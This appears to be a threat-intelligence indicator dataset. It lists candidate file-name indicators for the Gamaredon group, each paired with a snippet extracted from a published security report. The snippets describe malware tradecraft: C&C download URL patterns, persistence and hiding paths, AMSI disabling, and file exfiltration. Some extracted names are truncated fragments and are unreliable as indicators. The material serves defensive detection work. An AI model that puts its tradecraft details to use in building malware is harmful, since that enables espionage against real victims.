1.0.0,actor--gamaredon,artifact--sha256:7a5ad8d5c79302c40f5817bd01a97af17b7246395a057a93aeba2a35330e7307,observation--sha256:7539ac36e904f4df315bb0c66493bd28bbea394a3e9e0345d84212a53ecc755c,file-name,desktops.ini,desktops.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:49d7886d7177c285507ca0e2f239b0d89055ea6f15b94118c50827945990ddaf,observation--sha256:41f669f6dfde3b8ca2e5030292427c15ee28fc5c6a312c8684bff6db369bd096,file-name,desktopt.ini,desktopt.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"20 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Third variant As described in our Gamaredon 2024 whitepaper, the third variant uses a downloader component , which we’ve now named PteroQuark. On February 10th, 2025, PteroQuark was updated with these key changes: • The tokens that it expects in downloaded base64 -encoded payloads changed from ?? to ))). • PteroQuark’s C&C config is stored in alternate data streams instead of in registry values. It uses randomly nam",
1.0.0,actor--gamaredon,artifact--sha256:49d7886d7177c285507ca0e2f239b0d89055ea6f15b94118c50827945990ddaf,observation--sha256:5b181936cbcf82dcbac413846458b20bdd00512ef64910d01bb7957e4d312e24,file-name,desktopt.ini,desktopt.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:164c97f5155929109e3f1e46bf8edd42f419d78fe73c1e1f742a23800d8bf87d,observation--sha256:e7eef30ce69264367dfdad6898316a172d51d08b8493e5fcbf2ea2d9abc4bd47,file-name,.doc.lnk,doc.lnk,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Improving LNK lures The second variant of PteroLNK creates three types of malicious LNK files, each designed to lure victims into executing them. Over the course of 2025, Gamaredon repeatedly refined how these LNK files were generated, focusing on naming strategies and file t argeting to maximize the likelihood of user interaction. Below is a summary of each type and its final state by the end of the year: 1. LNK fi",
1.0.0,actor--gamaredon,artifact--sha256:a9c7c591e71fc7c990240172646380810b5239ecf40c56ac6cd3c5ccbb17c0a4,observation--sha256:32fc1dd1ac6063ae7145e83f8168e252212abb54972bdc80895de4513f3f4cb1,file-name,(.docx,docx,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Having created conditions for constant presence in the system and receiving constant requests from the victim's system, the group filters bots with the main malicious software. Also since the end of 2019, Armageddon started to implement VBSscipts, which completely replaced cmd files later and became the main scripts for the malware Pterodo functionality to be deployed in the system, to maintain persistence and download new specialized modules. Full usage of VBSscipts group has begun in 2020 and ",
1.0.0,actor--gamaredon,artifact--sha256:a159c9b11bea8b054ca84d6e55ee8beee21c4162109e7d8ab83ea82587b16f20,observation--sha256:a3d565d20a828d4526e24c68376f1d3cf682e71c4fdb8d748be31e574f5caed8,file-name,.docx.lnk,docx.lnk,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 payload, pauses for a few seconds, and deletes all three files: the dropper, itself, and the VBScript payload. Throughout PteroCDrop’s lifetime, Gamaredon has used various compilers to build it and in some of the samples this PDB path was left: E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb Overall, the most prevalent payload delivered by PteroCDrop is a VBScript version of PteroLNK. During 2023",
1.0.0,actor--gamaredon,artifact--sha256:a159c9b11bea8b054ca84d6e55ee8beee21c4162109e7d8ab83ea82587b16f20,observation--sha256:f726bd0cf8ce900178af6a54e536ac10e054c118cffa08fdb3d12b9dd452995e,file-name,.docx.lnk,docx.lnk,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,49 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tactic ID Name Description T1564.001 Hide Artifacts: Hidden Files and Directories PteroLNK creates hidden files. T1562.001 Impair Defenses: Disable or Modify Tools PteroSocks disables AMSI by calling the method AmsiUtils.Uninitialize . T1070.004 Indicator Removal: File Deletion PteroPSDoor deletes staged files after successful exfiltration. T1036.004 Masquerading: Masquerade Task or Service Gamaredon,
1.0.0,actor--gamaredon,artifact--sha256:a159c9b11bea8b054ca84d6e55ee8beee21c4162109e7d8ab83ea82587b16f20,observation--sha256:f6fb4328bbcb3b2153d9fcb6c2a5c5f4438f61406b94a1018b0dfe4a1d557489,file-name,.docx.lnk,docx.lnk,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"36 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1564.003 Hide Artifacts: Hidden Window Various Gamaredon tools spawn PowerShell processes with hidden windows. T1564.004 Hide Artifacts: NTFS File Attributes Various Gamaredon tools use alternate data streams to hide themselves and their C&C servers. T1070.004 Indicator Removal: File Deletion PteroBox, PteroPSDoor, and PteroVDoor delete staged files after successful exfiltration. T1036.00",
1.0.0,actor--gamaredon,artifact--sha256:d913a8dfd21b7d78030e5d99a47f9acf4839b18e3afa7fc3f21a51a72d9e18a9,observation--sha256:bc05ddef22d0b5aa6b9c0cafb0dbddd2df414c11cc994988efbda6a102ecec91,file-name,drive.php,drive.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:7673c4a856fa90a989bac59f463744d869282fabe81a2aa4487b6118dfede9be,observation--sha256:e3e29303693cfe114fbfea70fb0ab566b1d631c0ad3732c3856d1f91f1201cf6,file-name,esktop.sys,esktop.sys,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:18a0274e8ea301d8098321df63668be85832110ec7053ef4a4dac0e8f09a9b97,observation--sha256:3132f73592fed92bd6530c6947bf6ad73dc2d9b8a60afb9fbdd410cf463702db,file-name,esktop.vbs,esktop.vbs,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:47b09bf523ac3e779d99e35181b1991696bb457512a7261b031f5b10a6003226,observation--sha256:f6e90fb9e9a22e4a3f7df1b0c6b9fd1847db6d47eeb5835a24ac18784b4cfd03,file-name,esktops.sys,esktops.sys,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:80201b24fb86343c5271cfe504d1c76d4e97ed84c3766112236f9ce54584345c,observation--sha256:bd12a3e38a2a032a175807230d1b13fe617ba659b25c25d1dc10b02bdcded9e0,file-name,esktops.vbs,esktops.vbs,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:db5238ffc2de01a4832d352a38fcad85533d436b7bea25b21242f4a02f96e262,observation--sha256:39b29463d91403aa88d6fa24bf166b70a8fe9420bbb7b651f1c35c9308c3a688,file-name,(.exe,exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Recommendations In order to prevent cyberattacks by the hacker group Armageddon, the Security Service recommends the following: 1. Update system and application software promptly. 2. Deploy only licensed software products. 3. Block access to the Internet for MS Word, Excel and PowerPoint completely (prohibit office programs from initiating network connections), prohibit MS Office applications from running subsidiary processes, macros. Impleme nt Attack Surface Reduction to protect Microsoft Offi",
1.0.0,actor--gamaredon,artifact--sha256:d02c2d146ac29fa6522355b422f50fc6a3461f3fe236545cd2bd800fd53565e7,observation--sha256:404aa3b2625405ebdf92249f7e15de830b498c201fb0be3abf12e09d435ec8fa,file-name,fgrps.dll,fgrps.dll,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"2. The backdoor is injected into svchost using the hot patch API. Patching the loader is done by creating a section named \knowndlls\mstbl.dll. This DLL does not reside on disk, but is rather treated as a cached DLL by the session manager. It then proceeds to write a PE file within that section. 3. The PE file will have one section (.hotp1) with the hot patch header structure. This structure contains all the information necessary to perform the patching of function ntdll!LdrpMapViewOfSection, wh",
1.0.0,actor--gamaredon,artifact--sha256:4962f77767392bae081e15215585bbdea533b342acdf123d5d89be5df7bd009e,observation--sha256:0c1d51846071e00eea62c1700e35c3ad00682bbce6fa3ad1e40d3d709577eb6e,file-name,fun.doc,fun.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Lure documents are typically given topical names that may be of interest to the recipient. Such lures often address controversial subjects or offer provocative opinions, in an effort to incite the reader into opening them. Figure 3 shows a sample of such titles. Figure 3. Example document titles used by PLATINUM to deliver exploits SHA1 Filename e9f900b5d01320ccd4990fd322a459d709d43e4b Gambar gambar Rumah Gay Didiet Prabowo di Sentul Bogor.doc 9a4e82ba371cd2fedea0b889c879daee7a01e1b1 The real re",
1.0.0,actor--gamaredon,artifact--sha256:6af09e70f15dbf9832c4a5f0b33d7608c7cff2f641190321805cc06ea8e070df,observation--sha256:be07d29a6b8d56108d7e7481b29f5ebaa49fa0be2e0c8ffed1f5452c29104d79,file-name,get.php,get.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:6af09e70f15dbf9832c4a5f0b33d7608c7cff2f641190321805cc06ea8e070df,observation--sha256:e32f620aed432feff8c631dd7f29ec0e559cd1efeac254cf24dfe760a029cdc1,file-name,get.php,get.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:2cc2d638741d94077afae80fb228e4ef7dda45f24ee91d58730714b120aa9d02,observation--sha256:9c18260b6b8b777b97cd0f0eeafb906fff16c62e4d42576bce34d2cd9c77d15d,file-name,getinfo.php,getinfo.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:b10c518510a615d8d7f11390da6b47e7099691c88b1e8bc7d89351a9ccad6875,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:731295c6d519aa229214ac9cf1b4222ce42601ca049014aa24784a2c35814abf,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:d65b014860da800a1a495cba3f44091406e958c3686589ea91a39b7d5d306456,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 11. PteroEffigy Capabilities PteroEffigy acquires its C&C server from the G oFile cloud storage service using its REST API. Then, from the retrieved C&C server, it can download and execute up to 50 PowerShell payloads. After each individual download attempt, it sleeps for five minutes. Network protocol For communication with its C&C server, PteroEffigy uses an HTTP GET request with the URI path /index.php and",
1.0.0,actor--gamaredon,artifact--sha256:ab89b82b2232c5cc2a9a3dbd04d2cdc854009d1a2749f4c0e4eb7b8c29ed1131,observation--sha256:35c339e622da80a53453666caa1926613fc2b13272b2e844b8405e7b54e64fb2,file-name,info.vbs,info.vbs,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances PteroBox PteroBox is a known Gamaredon file stealer that we discovered at the end of 2024, and detailed in our Gamaredon 2024 white paper. During 2025, we discovered a new variant of PteroBox that uses the rclone utility to exfiltrate files to Dropbox; therefore, we named it the rclone variant. The API variant, as we now call the original variant, has been updated a few times throughout 2025, and both variants have ",
1.0.0,actor--gamaredon,artifact--sha256:ab89b82b2232c5cc2a9a3dbd04d2cdc854009d1a2749f4c0e4eb7b8c29ed1131,observation--sha256:9dff0e43755fefd2f03e569a69596299c1c893e02dedb875fa1a0fd606d1f93f,file-name,info.vbs,info.vbs,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:34a16297598eee8bc4e9bd83f11841414d40d674d2b5e33ec3bedbc38d1e321a,observation--sha256:2adc739f6d1d76154d5612400a59786acd51303fd14ca56b25d326e31c158520,file-name,init.php,init.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:9be17d8da4f13127d6ea2f6bb9bff9ec0d3c3c373c01703d13d2450716ebc044,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"18 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 13. The SFX config embedded in PteroSetup On execution, PteroSetup scans USB, mapped network, and fixed drives (except for the C: drive) for files with the .exe extension whose names contain one of the following substrings: install , setup, or cronos . Note that the files targeted by PteroSetup are not necessarily PE files, and can be of any type, since PteroSetup does not verify their contents, but for conve",
1.0.0,actor--gamaredon,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:f07c1621fd1361961ede72ec4a0c2a8b329b5c68e0f01cb9be9305296cc72625,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:56a607b17839126472b3393953f4b40c24857944996633cb823e9bc341a2cfde,observation--sha256:3e6f12a0a034a84de3f4a7145be13f2babd05692079c7fdf3ea5f13e642d56c7,file-name,jnwmon.exe,jnwmon.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"2. The backdoor is injected into svchost using the hot patch API. Patching the loader is done by creating a section named \knowndlls\mstbl.dll. This DLL does not reside on disk, but is rather treated as a cached DLL by the session manager. It then proceeds to write a PE file within that section. 3. The PE file will have one section (.hotp1) with the hot patch header structure. This structure contains all the information necessary to perform the patching of function ntdll!LdrpMapViewOfSection, wh",
1.0.0,actor--gamaredon,artifact--sha256:10cd90a01d087c3f5842f1d4d4ff4c5b43a8b1f685a34d9a86abe12970f8045e,observation--sha256:aeef63248122d98c570b5062b35c6b36e6e924e8a3ddf117cb197be788ecd124,file-name,.jpeg.lnk,jpeg.lnk,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Improving LNK lures The second variant of PteroLNK creates three types of malicious LNK files, each designed to lure victims into executing them. Over the course of 2025, Gamaredon repeatedly refined how these LNK files were generated, focusing on naming strategies and file t argeting to maximize the likelihood of user interaction. Below is a summary of each type and its final state by the end of the year: 1. LNK fi",
1.0.0,actor--gamaredon,artifact--sha256:10cd90a01d087c3f5842f1d4d4ff4c5b43a8b1f685a34d9a86abe12970f8045e,observation--sha256:130625759cbdb70d512a95b74d6870b750fd1f1a6da63fb61c1b68aff74f0d0b,file-name,.jpeg.lnk,jpeg.lnk,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"36 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1564.003 Hide Artifacts: Hidden Window Various Gamaredon tools spawn PowerShell processes with hidden windows. T1564.004 Hide Artifacts: NTFS File Attributes Various Gamaredon tools use alternate data streams to hide themselves and their C&C servers. T1070.004 Indicator Removal: File Deletion PteroBox, PteroPSDoor, and PteroVDoor delete staged files after successful exfiltration. T1036.00",
1.0.0,actor--gamaredon,artifact--sha256:1e72c22c5c371cd5ee39e39eeb90525813d214483eaba8cb296c777f284d1320,observation--sha256:f8fa070f77a004ae27a9e96794824b7204228884679e41c61e34bcad35c88be8,file-name,last.php,last.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
